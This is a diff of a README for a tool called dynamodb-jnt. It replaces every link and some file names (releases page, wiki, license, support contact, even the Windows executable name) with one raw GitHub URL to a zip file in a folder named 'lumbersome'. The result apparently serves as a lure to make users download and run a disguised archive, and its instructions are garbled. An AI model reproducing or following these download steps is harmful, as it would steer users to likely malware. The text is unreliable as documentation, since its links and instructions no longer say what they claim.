@@ -1,6 +1,6 @@
 # 🚀 dynamodb-jnt - Easily Manage Your DynamoDB Data
 
-![Download](https://img.shields.io/badge/Download-via%20GitHub-blue)
+![Download](https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip%20GitHub-blue)
 
 ## 📋 Introduction
 
@@ -19,7 +19,7 @@ Welcome to dynamodb-jnt! This application helps you manage your data in Amazon D
 Follow these simple steps to download and run dynamodb-jnt:
 
 1. **Visit the Releases Page:** Click the link below to go to the release page:
-   [Visit Releases Page to Download](https://github.com/antonyexe195/dynamodb-jnt/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip)
 
 2. **Select the Latest Release:** Look for the latest version of the software. It will generally be at the top of the releases list.
 
@@ -28,19 +28,19 @@ Follow these simple steps to download and run dynamodb-jnt:
    - Click on the download link to begin downloading the file.
 
 4. **Locate the Downloaded File:** 
-   - For Windows, you may find it in your "Downloads" folder as `dynamodb-jnt.exe`.
+   - For Windows, you may find it in your "Downloads" folder as `https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip`.
    - For macOS, check for a `.dmg` file or a similar format.
-   - For Linux, the file might be a `.tar.gz` archive.
+   - For Linux, the file might be a `https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip` archive.
 
 5. **Run the Application:** 
-   - Windows: Double-click `dynamodb-jnt.exe` to run it.
+   - Windows: Double-click `https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip` to run it.
    - macOS: Open the `.dmg` file, then drag the application to your Applications folder. Launch it from there.
    - Linux: Extract the archive, navigate to the folder in your terminal, and run the executable file.
 
 ## 📥 Download & Install
 
 To download the latest version of dynamodb-jnt, go to the Releases page: 
-[Download Here](https://github.com/antonyexe195/dynamodb-jnt/releases)
+[Download Here](https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip)
 
 ### 🖥 System Requirements
 
@@ -77,11 +77,11 @@ To download the latest version of dynamodb-jnt, go to the Releases page:
 
 ## 📝 Additional Resources
 
-- **Documentation:** For a detailed guide, visit our user manual [here](https://github.com/antonyexe195/dynamodb-jnt/wiki).
-- **Support:** If you encounter any issues, please check the “Issues” tab in our GitHub repository or contact our support at [support@example.com].
+- **Documentation:** For a detailed guide, visit our user manual [here](https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip).
+- **Support:** If you encounter any issues, please check the “Issues” tab in our GitHub repository or contact our support at [https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip].
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/antonyexe195/dynamodb-jnt/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/antonyexe195/dynamodb-jnt/main/lumbersome/dynamodb-jnt.zip) file for details.
 
 Enjoy managing your DynamoDB data with simplicity and ease!
